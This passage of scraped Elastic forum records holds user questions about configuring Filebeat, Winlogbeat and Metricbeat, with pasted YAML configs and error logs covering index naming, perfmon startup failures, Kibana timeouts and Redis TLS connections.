    "title": "Implementation question: Central syslog server vs filebeat on each machine",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "andywt123",
    "date": "April 10, 2020, 2:19pm April 10, 2020, 5:32pm",
    "body": "I am new to elasticsearch. We are currently migrating from Splunk to Elastic. When we setup splunk the best practice was to use a central syslog server and ingest all the different servers logs from one point. Does Elastic have a best practice concerning this? Does it make more sense to install Filebeat on every server and manage them individually or use rsyslog to forward them to one location and then ingest them? Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "6a194887-d219-476d-96a8-2f0e67834e70",
    "url": "https://discuss.elastic.co/t/change-loaded-index-name/227272",
    "title": "Change loaded index name",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "kickon",
    "date": "April 9, 2020, 7:57am April 9, 2020, 11:32am April 9, 2020, 5:15pm April 9, 2020, 6:41pm April 9, 2020, 8:06pm April 10, 2020, 10:05am April 10, 2020, 2:01pm",
    "body": "hello, I cannot anymore change index name loaded by winlogbeat, could someone look at this and indicate where is an issue ? ###################### Winlogbeat Configuration Example ######################## # This file is an example configuration file highlighting only the most common # options. The winlogbeat.reference.yml file from the same directory contains # all the supported options with more comments. You can use it as a reference. # # You can find the full configuration reference here: # https://www.elastic.co/guide/en/beats/winlogbeat/index.html #======================= Winlogbeat specific options =========================== # event_logs specifies a list of event logs to monitor as well as any # accompanying options. The YAML data type of event_logs is a list of # dictionaries. # # The supported keys are name (required), tags, fields, fields_under_root, # forwarded, ignore_older, level, event_id, provider, and include_xml. Please # visit the documentation for the complete details of each option. # https://go.es.io/WinlogbeatConfig #winlogbeat.event_logs: # - name: Application # ignore_older: 72h # - name: Security # - name: System winlogbeat.event_logs: - name: Application level: critical,error,warning - name: Security ignore_older: 72h processors: - drop_event: when: and: - or: - equals.winlog.event_id: 4624 - equals.winlog.event_id: 4634 - equals.winlog.event_data.TargetUserName: \"SYSTEM\" - script: lang: javascript id: security file: ${path.home}/module/security/config/winlogbeat-security.js # - name: Microsoft-Windows-Sysmon/Operational # processors: # - script: # lang: javascript # id: sysmon # file: ${path.home}/module/sysmon/config/winlogbeat-sysmon.js #============================== Template ===================================== # A template is used to set the mapping in Elasticsearch # By default template loading is enabled and the template is loaded. # These settings can be adjusted to load your own template or overwrite existing ones. # Set to false to disable template loading. #setup.template.enabled: true # Template name. By default the template name is \"winlogbeat-%{[agent.version]}\" # The template name and pattern has to be set in case the Elasticsearch index pattern is modified. setup.template.name: \"XXX-%{[agent.version]}\" # Template pattern. By default the template pattern is \"-%{[agent.version]}-*\" to apply to the default index settings. # The first part is the version of the beat and then -* is used to match all daily indices. # The template name and pattern has to be set in case the Elasticsearch index pattern is modified. setup.template.pattern: \"XXX-%{[agent.version]}-*\" # Path to fields.yml file to generate the template #setup.template.fields: \"${path.config}/fields.yml\" # A list of fields to be added to the template and Kibana index pattern. Also # specify setup.template.overwrite: true to overwrite the existing template. # This setting is experimental. #setup.template.append_fields: #- name: field_name # type: field_type # Enable JSON template loading. If this is enabled, the fields.yml is ignored. #setup.template.json.enabled: false # Path to the JSON template file #setup.template.json.path: \"${path.config}/template.json\" # Name under which the template is stored in Elasticsearch #setup.template.json.name: \"\" # Overwrite existing template #setup.template.overwrite: false # Elasticsearch template settings setup.template.settings: # A dictionary of settings to place into the settings.index dictionary # of the Elasticsearch template. For more details, please check # https://www.elastic.co/guide/en/elasticsearch/reference/current/mapping.html index: number_of_shards: 1 #codec: best_compression #number_of_routing_shards: 30 # A dictionary of settings for the _source field. For more details, please check # https://www.elastic.co/guide/en/elasticsearch/reference/current/mapping-source-field.html #_source: #enabled: false #================================ General ===================================== # The name of the shipper that publishes the network data. It can be used to group # all the transactions sent by a single shipper in the web interface. #name: # The tags of the shipper are included in their own field with each # transaction published. #tags: [\"service-X\", \"web-tier\"] # Optional fields that you can specify to add additional information to the # output. #fields: # env: staging #============================== Dashboards ===================================== # These settings control loading the sample dashboards to the Kibana index. Loading # the dashboards is disabled by default and can be enabled either by setting the # options here or by using the `setup` command. #setup.dashboards.enabled: true # The URL from where to download the dashboards archive. By default this URL # has a value which is computed based on the Beat name and version. For released # versions, this URL points to the dashboard archive on the artifacts.elastic.co # website. #setup.dashboards.url: #============================== Setup ILM ===================================== # Configure index lifecycle management (ILM). These settings create a write # alias and add additional settings to the index template. When ILM is enabled, # output.elasticsearch.index is ignored, and the write alias is used to set the # index name. # Enable ILM support. Valid values are true, false, and auto. When set to auto # (the default), the Beat uses index lifecycle management when it connects to a # cluster that supports ILM; otherwise, it creates daily indices. #setup.ilm.enabled: auto # Set the prefix used in the index lifecycle write alias name. The default alias # name is 'winlogbeat-%{[agent.version]}'. #setup.ilm.rollover_alias: \"X\" # Set the rollover index pattern. The default is \"%{now/d}-000001\". #setup.ilm.pattern: \"{now/d}-000001\" # Set the lifecycle policy name. The default policy name is # 'winlogbeat'. #setup.ilm.policy_name: \"mypolicy\" # The path to a JSON file that contains a lifecycle policy configuration. Used # to load your own lifecycle policy. #setup.ilm.policy_file: # Disable the check for an existing lifecycle policy. The default is false. If # you disable this check, set setup.ilm.overwrite: true so the lifecycle policy # can be installed. #setup.ilm.check_exists: false # Overwrite the lifecycle policy at startup. The default is false. #setup.ilm.overwrite: true #============================== Kibana ===================================== # Starting with Beats version 6.0.0, the dashboards are loaded via the Kibana API. # This requires a Kibana endpoint configuration. setup.kibana: # Kibana Host # Scheme and port can be left out and will be set to the default (http and 5601) # In case you specify and additional path, the scheme is required: http://localhost:5601/path # IPv6 addresses should always be defined as: https://[2001:db8::1]:5601 host: \"IP:5601\" # Kibana Space ID # ID of the Kibana Space into which the dashboards should be loaded. By default, # the Default Space will be used. #space.id: #============================= Elastic Cloud ================================== # These settings simplify using Winlogbeat with the Elastic Cloud (https://cloud.elastic.co/). # The cloud.id setting overwrites the `output.elasticsearch.hosts` and # `setup.kibana.host` options. # You can find the `cloud.id` in the Elastic Cloud web UI. #cloud.id: # The cloud.auth setting overwrites the `output.elasticsearch.username` and # `output.elasticsearch.password` settings. The format is `<user>:<pass>`. #cloud.auth: #================================ Outputs ===================================== # Configure what output to use when sending the data collected by the beat. #-------------------------- Elasticsearch output ------------------------------ output.elasticsearch: # Array of hosts to connect to. hosts: [\"IP:9200\"] # Protocol - either `http` (default) or `https`. #protocol: \"http\" # Authentication credentials - either API key or username/password. #api_key: \"id:api_key\" #username: \"elastic\" #password: \"changeme\" index: \"XXX-%{[agent.version]}-%{+yyyy.MM.dd}\" #----------------------------- Logstash output -------------------------------- #output.logstash: # The Logstash hosts #hosts: [\"10.184.226.232:5044\"] # Optional SSL. By default is off. # List of root certificates for HTTPS server verifications #ssl.certificate_authorities: [\"/etc/pki/root/ca.pem\"] # Certificate for SSL client authentication #ssl.certificate: \"/etc/pki/client/cert.pem\" # Client Certificate Key #ssl.key: \"/etc/pki/client/cert.key\" #================================ Processors ===================================== # Configure processors to enhance or manipulate events generated by the beat. processors: - add_host_metadata: ~ - add_cloud_metadata: ~ - add_docker_metadata: ~ #================================ Logging ===================================== # Sets log level. The default log level is info. # Available log levels are: error, warning, info, debug #logging.level: debug # At debug level, you can selectively enable logging only for some components. # To enable all selectors use [\"*\"]. Examples of other selectors are \"beat\", # \"publish\", \"service\". #logging.selectors: [\"*\"] #============================== X-Pack Monitoring =============================== # winlogbeat can export internal metrics to a central Elasticsearch monitoring # cluster. This requires xpack monitoring to be enabled in Elasticsearch. The # reporting is disabled by default. # Set to true to enable the monitoring reporter. #monitoring.enabled: false # Sets the UUID of the Elasticsearch cluster under which monitoring data for this # Winlogbeat instance will appear in the Stack Monitoring UI. If output.elasticsearch # is enabled, the UUID is derived from the Elasticsearch cluster referenced by output.elasticsearch. #monitoring.cluster_uuid: # Uncomment to send the metrics to Elasticsearch. Most settings from the # Elasticsearch output are accepted here as well. # Note that the settings should point to your Elasticsearch *monitoring* cluster. # Any setting that is not set is automatically inherited from the Elasticsearch # output configuration, so if you have the Elasticsearch output configured such # that it is pointing to your Elasticsearch monitoring cluster, you can simply # uncomment the following line. #monitoring.elasticsearch: #================================= Migration ================================== # This allows to enable 6.7 migration aliases #migration.6_to_7.enabled: true",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "55423ef5-6e8c-4650-b866-c0502b6c4e7d",
    "url": "https://discuss.elastic.co/t/metricbeat-7-6-1-on-windows-fails-to-start-sometimes/227329",
    "title": "Metricbeat 7.6.1 on Windows fails to start sometimes",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "jori-be",
    "date": "April 9, 2020, 1:25pm April 10, 2020, 4:57am April 10, 2020, 9:53am",
    "body": "Hi all, We are running Metricbeat 7.6.1 on Windows 10 1909 and we notice that sometimes (once in 5 times) metricbeat does not start. Note: Metricbeat is started via Windows Service. This is what happens in the logs: 2020-04-09T15:04:14.522+0200 INFO instance/beat.go:622 Home path: [C:\\tools\\metricbeat] Config path: [C:\\tools\\metricbeat] Data path: [C:\\tools\\metricbeat\\data] Logs path: [C:\\tools\\metricbeat\\logs]* *2020-04-09T15:04:14.531+0200 INFO instance/beat.go:630 Beat ID: 9a8a098b-c0e2-40ae-affd-581c6e0cc68c* *2020-04-09T15:04:14.531+0200 INFO [beat] instance/beat.go:958 Beat info {\"system_info\": {\"beat\": {\"path\": {\"config\": \"C:\\\\tools\\\\metricbeat\", \"data\": \"C:\\\\tools\\\\metricbeat\\\\data\", \"home\": \"C:\\\\tools\\\\metricbeat\", \"logs\": \"C:\\\\tools\\\\metricbeat\\\\logs\"}, \"type\": \"metricbeat\", \"uuid\": \"9a8a098b-c0e2-40ae-affd-581c6e0cc68c\"}}}* *2020-04-09T15:04:14.532+0200 INFO [beat] instance/beat.go:967 Build info {\"system_info\": {\"build\": {\"commit\": \"c1c49432bdc53563e63e9d684ca3e9843626e448\", \"libbeat\": \"7.6.1\", \"time\": \"2020-02-28T23:15:46.000Z\", \"version\": \"7.6.1\"}}}* *2020-04-09T15:04:14.532+0200 INFO [beat] instance/beat.go:970 Go runtime info {\"system_info\": {\"go\": {\"os\":\"windows\",\"arch\":\"amd64\",\"max_procs\":8,\"version\":\"go1.13.8\"}}}* *2020-04-09T15:04:14.540+0200 INFO [beat] instance/beat.go:974 Host info {\"system_info\": {\"host\": {\"architecture\":\"x86_64\",\"boot_time\":\"2020-04-09T12:45:24.36+02:00\",\"name\":\"DESK-JORI\",\"ip\":[\"192.168.0.50/24\",\"fe80::fcc2:f0bb:e071:1188/64\",\"10.95.252.26/24\",\"::1/128\",\"127.0.0.1/8\"],\"kernel_version\":\"10.0.18362.418 (WinBuild.160101.0800)\",\"mac\":[\"00:24:9b:4b:21:34\",\"b8:ca:3a:7a:1b:7d\"],\"os\":{\"family\":\"windows\",\"platform\":\"windows\",\"name\":\"Windows 10 Pro\",\"version\":\"10.0\",\"major\":10,\"minor\":0,\"patch\":0,\"build\":\"18363.418\"},\"timezone\":\"CEST\",\"timezone_offset_sec\":7200,\"id\":\"473f1c02-4853-42c8-8b67-e51e22b36468\"}}}* *2020-04-09T15:04:14.542+0200 INFO [beat] instance/beat.go:1003 Process info {\"system_info\": {\"process\": {\"cwd\": \"C:\\\\Windows\\\\system32\", \"exe\": \"C:\\\\tools\\\\metricbeat\\\\metricbeat-7.6.1-windows-x86_64.exe\", \"name\": \"metricbeat-7.6.1-windows-x86_64.exe\", \"pid\": 5064, \"ppid\": 768, \"start_time\": \"2020-04-09T15:04:13.606+0200\"}}}* *2020-04-09T15:04:14.542+0200 INFO instance/beat.go:298 Setup Beat: metricbeat; Version: 7.6.1* *2020-04-09T15:04:14.543+0200 INFO [publisher] pipeline/module.go:110 Beat name: DESK-JORI* *2020-04-09T15:04:14.545+0200 INFO helper/privileges_windows.go:79 Metricbeat process and system info: {\"OSVersion\":{\"Major\":6,\"Minor\":2,\"Build\":9200},\"Arch\":\"amd64\",\"NumCPU\":8,\"User\":{\"SID\":\"S-1-5-18\",\"Account\":\"SYSTEM\",\"Domain\":\"NT AUTHORITY\",\"Type\":1},\"ProcessPrivs\":{\"SeAssignPrimaryTokenPrivilege\":{\"enabled\":false},\"SeAuditPrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeBackupPrivilege\":{\"enabled\":false},\"SeChangeNotifyPrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeCreateGlobalPrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeCreatePagefilePrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeCreatePermanentPrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeCreateSymbolicLinkPrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeDebugPrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeDelegateSessionUserImpersonatePrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeImpersonatePrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeIncreaseBasePriorityPrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeIncreaseQuotaPrivilege\":{\"enabled\":false},\"SeIncreaseWorkingSetPrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeLoadDriverPrivilege\":{\"enabled\":false},\"SeLockMemoryPrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeManageVolumePrivilege\":{\"enabled\":false},\"SeProfileSingleProcessPrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeRestorePrivilege\":{\"enabled\":false},\"SeSecurityPrivilege\":{\"enabled\":false},\"SeShutdownPrivilege\":{\"enabled\":false},\"SeSystemEnvironmentPrivilege\":{\"enabled\":false},\"SeSystemProfilePrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeSystemtimePrivilege\":{\"enabled\":false},\"SeTakeOwnershipPrivilege\":{\"enabled\":false},\"SeTcbPrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeTimeZonePrivilege\":{\"enabled_by_default\":true,\"enabled\":true},\"SeUndockPrivilege\":{\"enabled\":false}}}* *2020-04-09T15:04:14.545+0200 INFO helper/privileges_windows.go:87 SeDebugPrivilege is enabled. SeDebugPrivilege=(Default, Enabled)* *2020-04-09T15:04:14.545+0200 WARN [cfgwarn] perfmon/perfmon.go:60 BETA: The perfmon metricset is beta* *2020-04-09T15:04:14.702+0200 INFO instance/beat.go:412 metricbeat stopped.* *2020-04-09T15:04:14.725+0200 ERROR instance/beat.go:933 Exiting: 1 error: 1 error: initialization of reader failed: failed to expand counter (query=\"\\Processor Information(*)\\% of Maximum Frequency\") Notice the error message, we are using perfmon counters as input, but sometimes we see similar messages like this after starting Metricbeat. Also the error is not always the same perfmon counter, seems to be random. beat.yml config: metricbeat.modules: - module: windows metricsets: [perfmon] period: 10s perfmon.ignore_non_existent_counters: false perfmon.counters: # global - instance_label: system_uptime instance_name: uptime measurement_label: system_uptime_seconds query: '\\System\\System Up Time' - instance_label: system_processes instance_name: processes measurement_label: system_processes_count query: '\\System\\Processes' - instance_label: system_threads instance_name: threads measurement_label: system_threads_count query: '\\System\\Threads' - instance_label: system_bytes_received instance_name: network measurement_label: system_network_bytes_received query: '\\Network Adapter(*)\\Bytes Received/sec' - instance_label: system_bytes_sent instance_name: network measurement_label: system_network_bytes_sent query: '\\Network Adapter(*)\\Bytes Sent/sec' - instance_label: system_avg_disk_queue instance_name: disk measurement_label: system_disk_avg_disk_queue query: '\\LogicalDisk(*)\\Avg. Disk Queue Length' - instance_label: system_curr_disk_queue instance_name: disk measurement_label: system_disk_curr_disk_queue query: '\\Processor(*)\\% Interrupt Time' - instance_label: system_interrupt_sec instance_name: processor measurement_label: system_processor_interrupt_sec query: '\\Processor(*)\\Interrupts/sec' - instance_label: system_freq_pct instance_name: processor measurement_label: system_processor_freq_pct query: '\\Processor Information(*)\\% of Maximum Frequency' - instance_label: system_freq instance_name: processor measurement_label: system_processor_freq query: '\\Processor Information(*)\\Processor Frequency' # CPU and MEM per process - instance_label: processor.name instance_name: total measurement_label: processor.time.total.pct query: '\\Processor Information(_Total)\\% Processor Time' - instance_label: memory.name instance_name: total measurement_label: memory.bytes.private query: '\\Process(_Total)\\Private Bytes' - instance_label: processor.name instance_name: metricbeat measurement_label: processor.time.total.pct query: '\\Process(metricbeat)\\% Processor Time' - instance_label: memory.name instance_name: metricbeat measurement_label: memory.bytes.private query: '\\Process(metricbeat)\\Private Bytes' - instance_label: processor.name instance_name: filebeat measurement_label: processor.time.total.pct query: '\\Process(filebeat)\\% Processor Time' - instance_label: memory.name instance_name: filebeat measurement_label: memory.bytes.private query: '\\Process(filebeat)\\Private Bytes' fields: beat_build: '0.0.1' fields_under_root: true output.kafka: hosts: - 1.0.0.1:9092 - 1.0.0.2:9092 - 1.0.0.3:9092 version: \"0.10.2.1\" topic: 'metricbeat' compression: gzip compression_level: 9 monitoring: enabled: true cluster_uuid: '1234' elasticsearch: hosts: - http://1.0.0.1:9200 - http://1.0.0.2:9200 - http://1.0.0.3:9200 Note: IP addresses are dummy addresses I've upgraded to 7.6.1 to solve this problem, the version with the same problem was 7.4.0. Note: The system locale is set to 'English (United States)'. Anyone an idea what is wrong? Thanks! Best regards, Jori",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "88d1c3dd-34a2-4451-b121-bb35e5ef0717",
    "url": "https://discuss.elastic.co/t/fails-sudo-filebeat-setup-dashboards-e/227261",
    "title": "Fails : sudo filebeat setup --dashboards -e (",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "zero.lim",
    "date": "April 9, 2020, 7:28am April 9, 2020, 11:39am April 9, 2020, 12:22pm April 10, 2020, 10:07am April 10, 2020, 8:50am",
    "body": "Hi all , My problem is ... Exiting: error connecting to Kibana: fail to get the Kibana version: HTTP GET request to https://kibana.nextlink.technology:5601/app/kibana/api/status fails: fail to execute the HTTP GET request: Get https://kibana.nextlink.technology:5601/app/kibana/api/status: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers). Response: . filebeat.yml setup.kibana: host: \"https://kibana.nextlink.technology/app/kibana\" username: \"xxxxxx\" password: \"xxxxxx\" kibana domain https://kibana.nextlink.technology/app/kibana image1101×111 8.39 KB",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "b26fb953-bdb7-4552-80dc-903cd104f90a",
    "url": "https://discuss.elastic.co/t/under-special-log-rolling-strategy-filebeat-repeatedly-collects-logs/223036",
    "title": "Under special log rolling strategy, filebeat repeatedly collects logs",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "xiongjunkun",
    "date": "March 11, 2020, 2:36am March 11, 2020, 8:17am March 18, 2020, 2:24pm March 18, 2020, 2:29pm April 10, 2020, 3:03am April 10, 2020, 3:05am April 10, 2020, 3:38am",
    "body": "I have a special log rolling strategy. The application keeps writing logs to file f. When file f reaches the rolling threshold, f is renamed to f1, the original f1 is renamed to f2, and so on. Recently, we found There are a lot of duplicates in the logs collected by filebeat, which is suspected to be caused by this log rolling strategy, but there is no specific reason for the duplicate logs. Does anyone know the cause of the duplicate logs?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "76a93ba0-6305-4180-88b6-b46a1d9d3f31",
    "url": "https://discuss.elastic.co/t/filebeat-stats-and-metrics/227408",
    "title": "Filebeat Stats and Metrics",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "April 9, 2020, 9:37pm April 9, 2020, 11:16pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "3159f7b1-88eb-4257-abaa-1d9e3b0e8aef",
    "url": "https://discuss.elastic.co/t/winlogbeat-msi-create-service/227267",
    "title": "Winlogbeat MSI create service",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "",
    "date": "April 9, 2020, 7:46am April 9, 2020, 8:16am April 9, 2020, 8:46am April 9, 2020, 9:01am April 9, 2020, 9:52am April 9, 2020, 1:47pm April 9, 2020, 3:25pm",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "c8e9f5a4-fb00-4716-9ad1-c2612fb4beb5",
    "url": "https://discuss.elastic.co/t/filebeat-sending-all-data-from-file-not-just-new-line-added/227215",
    "title": "Filebeat sending all data from file not just new line added",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "NetRajan",
    "date": "April 8, 2020, 10:29pm April 9, 2020, 1:57pm April 9, 2020, 1:56pm",
    "body": "I am bit puzzled why Filebeat is sending all file data when only one line is added. I am expecting to behave like tail -f and send only one newly added file Screen Shot 2020-04-08 at 3.28.28 PM2048×1456 912 KB",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7175bbb5-fbb6-4995-b361-aba45ee55f15",
    "url": "https://discuss.elastic.co/t/metricbeat-redis-module-connection-to-digitalocean-db-failure/227133",
    "title": "Metricbeat Redis Module Connection to Digitalocean DB Failure",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Henco",
    "date": "April 8, 2020, 1:14pm April 9, 2020, 12:20pm April 9, 2020, 1:08pm",
    "body": "Hi, I am trying to connect the redis module of metricbeat to a digitalocean hosted redis database; but EOF errors are thrown. Is there an alternate approach I should use to connect to a redis server over TLS as apposed to a connection string of the following format 'rediss://username:password@private-xxx-redis-do-user-xxx-0.a.db.ondigitalocean.com:25061'? My module config is as follows # Module: redis # Docs: https://www.elastic.co/guide/en/beats/metricbeat/7.6/metricbeat-module-redis.html - module: redis enabled: true metricsets: [\"info\", \"keyspace\", \"key\"] key.patterns: - pattern: '*' period: 60s # Redis hosts hosts: [\"rediss://username:password@private-xxx-redis-do-user-xxx-0.a.db.ondigitalocean.com:25061\"] # Network type to be used for redis connection. Default: tcp network: tcp # Max number of concurrent connections. Default: 10 #maxconn: 10 # Redis AUTH password. Empty by default. # password: \"foo\" The errors returned are Apr 08 12:46:05 xxx-xxx-1 metricbeat[28087]: 2020-04-08T12:46:05.310Z ERROR redis/redis.go:70 Error retrieving INFO stats: EOF Apr 08 12:46:05 xxx-xxx-1 metricbeat[28087]: 2020-04-08T12:46:05.315Z INFO module/wrapper.go:252 Error fetching data for metricset redis.keyspace: Failed to fetch redis info for keyspaces: EOF Apr 08 12:46:05 xxx-xxx-1 metricbeat[28087]: 2020-04-08T12:46:05.315Z ERROR redis/redis.go:70 Error retrieving INFO stats: EOF Apr 08 12:46:05 xxx-xxx-1 metricbeat[28087]: 2020-04-08T12:46:05.315Z INFO module/wrapper.go:252 Error fetching data for metricset redis.info: failed to fetch redis info: EOF Apr 08 12:46:05 xxx-xxx-1 metricbeat[28087]: 2020-04-08T12:46:05.317Z ERROR [redis.key] key/key.go:90 Failed to select keyspace 0: EOF Running metricbeat test sudo metricbeat test modules redis Results in: redis... info... error... ERROR failed to fetch redis info: EOF keyspace... error... ERROR Failed to fetch redis info for keyspaces: EOF key... error... ERROR EOF connecting directly to redis from the same server with redli ./redli --tls -h private-xxx-redis-do-user-xxx-0.a.db.ondigitalocean.com -a xxx -p 25061 results in # Server redis_version:5.0.6 redis_git_sha1:xxx redis_git_dirty:1 redis_build_id:788e1c4d45b82fe1 redis_mode:standalone os:Linux 5.5.10-100.fc30.x86_64 x86_64 arch_bits:64 multiplexing_api:epoll atomicvar_api:atomic-builtin gcc_version:9.2.1 process_id:58 run_id:xxx tcp_port:25060 uptime_in_seconds:596205 uptime_in_days:6 hz:10 configured_hz:10 lru_clock:9291355 executable:/usr/bin/redis-server config_file:/etc/redis.conf # Clients connected_clients:676 client_recent_max_input_buffer:2 client_recent_max_output_buffer:0 blocked_clients:221 # Memory used_memory:76583128 used_memory_human:73.04M used_memory_rss:78012416 used_memory_rss_human:74.40M used_memory_peak:143037008 used_memory_peak_human:136.41M used_memory_peak_perc:53.54% used_memory_overhead:34081900 used_memory_startup:791368 used_memory_dataset:42501228 used_memory_dataset_perc:56.08% allocator_allocated:77002728 allocator_active:82821120 allocator_resident:88924160 total_system_memory:2077958144 total_system_memory_human:1.94G used_memory_lua:59392 used_memory_lua_human:58.00K used_memory_scripts:15872 used_memory_scripts_human:15.50K number_of_cached_scripts:8 maxmemory:1196425216 maxmemory_human:1.11G maxmemory_policy:allkeys-lru allocator_frag_ratio:1.08 allocator_frag_bytes:5818392 allocator_rss_ratio:1.07 allocator_rss_bytes:6103040 rss_overhead_ratio:0.88 rss_overhead_bytes:-10911744 mem_fragmentation_ratio:1.01 mem_fragmentation_bytes:1102400 mem_not_counted_for_evict:0 mem_replication_backlog:0 mem_clients_slaves:0 mem_clients_normal:13569452 mem_aof_buffer:0 mem_allocator:jemalloc-5.1.0 active_defrag_running:0 lazyfree_pending_objects:0 # Persistence loading:0 rdb_changes_since_last_save:11488 rdb_bgsave_in_progress:0 rdb_last_save_time:1586349061 rdb_last_bgsave_status:ok rdb_last_bgsave_time_sec:1 rdb_current_bgsave_time_sec:-1 rdb_last_cow_size:7241728 aof_enabled:0 aof_rewrite_in_progress:0 aof_rewrite_scheduled:0 aof_last_rewrite_time_sec:-1 aof_current_rewrite_time_sec:-1 aof_last_bgrewrite_status:ok aof_last_write_status:ok aof_last_cow_size:0 # Stats total_connections_received:22180 total_commands_processed:63102197 instantaneous_ops_per_sec:226 total_net_input_bytes:7320953780 total_net_output_bytes:6364093769 instantaneous_input_kbps:28.00 instantaneous_output_kbps:20.55 rejected_connections:0 sync_full:0 sync_partial_ok:0 sync_partial_err:0 expired_keys:1067735 expired_stale_perc:1.10 expired_time_cap_reached_count:0 evicted_keys:0 keyspace_hits:6800789 keyspace_misses:21819994 pubsub_channels:6 pubsub_patterns:221 latest_fork_usec:3041 migrate_cached_sockets:0 slave_expires_tracked_keys:0 active_defrag_hits:0 active_defrag_misses:0 active_defrag_key_hits:0 active_defrag_key_misses:0 # Replication role:master connected_slaves:0 master_replid:xxx master_replid2:xxx master_repl_offset:xxx second_repl_offset:-1 repl_backlog_active:0 repl_backlog_size:119537664 repl_backlog_first_byte_offset:12401 repl_backlog_histlen:6155547 # CPU used_cpu_sys:1184.316759 used_cpu_user:1213.092153 used_cpu_sys_children:30.350496 used_cpu_user_children:353.322085 # Cluster cluster_enabled:0 # Keyspace db0:keys=242449,expires=242206,avg_ttl=43743079 The metricbeat config file is metricbeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: true reload.period: 10s setup.template.settings: index.number_of_shards: 1 index.codec: best_compression setup.dashboards.enabled: false setup.kibana: host: \"localhost:5601\" username: \"xxx\" password: \"xxx\" output.elasticsearch: hosts: [\"localhost:9200\"] username: \"xxx\" password: \"xxx\" processors: - add_host_metadata: ~ - add_cloud_metadata: ~ - add_docker_metadata: ~ - add_kubernetes_metadata: ~ monitoring.enabled: true path.data: /var/lib/beats path.logs: /var/log/beats",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "136f2803-6b3b-45b4-87d8-738d40b5734c",
    "url": "https://discuss.elastic.co/t/redis-module/227299",
    "title": "Redis module",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "rschirin",
    "date": "April 9, 2020, 10:54am April 9, 2020, 12:34pm",
    "body": "Hi, in my current scenario I have 2 different Redis instances running on the same server. I have installed Metricbeat and enabled its module; is there a way to collect data from both instances? should I just put them into hosts field contained in redis.module? is there a way to add a tag to them? for instance, when I get data from instance A I want the tag AAA while for instance B I want the tag BBB thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d4e0bfce-1d0b-4898-8695-33a47b21a7c4",
    "url": "https://discuss.elastic.co/t/metricbeat-7-4-index-not-created-daily/226728",
    "title": "Metricbeat 7.4 index not created daily",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "",
    "date": "April 6, 2020, 2:14pm April 6, 2020, 5:43pm April 6, 2020, 8:39pm April 9, 2020, 11:14am April 9, 2020, 11:15am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "d18cae54-c967-42a7-b98b-477819b50112",
    "url": "https://discuss.elastic.co/t/wilnlogbeat-7-6-elasticsearch-tls-handshake-failure/227259",
    "title": "Wilnlogbeat 7.6 Elasticsearch TLS Handshake failure",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "",
    "date": "April 9, 2020, 7:17am April 9, 2020, 9:28am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "0becedb9-8b31-4790-bf21-b718af16d1e3",
    "url": "https://discuss.elastic.co/t/add-module-for-an-exterior-service-in-metricbeat-yml-error/227042",
    "title": "Add module for an exterior service in metricbeat.yml error",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Mehak_Bhargava",
    "date": "April 8, 2020, 8:05pm April 8, 2020, 8:06pm April 9, 2020, 8:22am",
    "body": "I have a service running called OB-Mail Agent in windows and I want to add that in my metricbeat.yml file. What will be the value of metricbeat and module? it runs as expected when no new modules are added as below metricbeat.modules: - module: OB-Alerts Processor metricsets: [\"memory\"] period: 5s - module: OB-Base24 EMS IB metricsets: [\"cpu\"] period: 5s - module: OB-Command and Control metricsets: [\"network\"] period: 60s - module: OB-Mail Agent metricsets: [\"status\"] period: 60s Error in powershell is S C:\\Program Files\\Metricbeat> Start-Service metricbeat tart-Service : Service 'metricbeat (metricbeat)' cannot be started due to the following error: Cannot start service etricbeat on computer '.'. t line:1 char:1 Start-Service metricbeat ~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service], ServiceCommandException + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand below is metricbeat.log 2020-04-08T12:42:21.850-0700 INFO instance/beat.go:622 Home path: [C:\\Program Files\\Metricbeat] Config path: [C:\\Program Files\\Metricbeat] Data path: [C:\\Program Files\\Metricbeat\\data] Logs path: [C:\\Program Files\\Metricbeat\\logs] 2020-04-08T12:42:21.855-0700 INFO 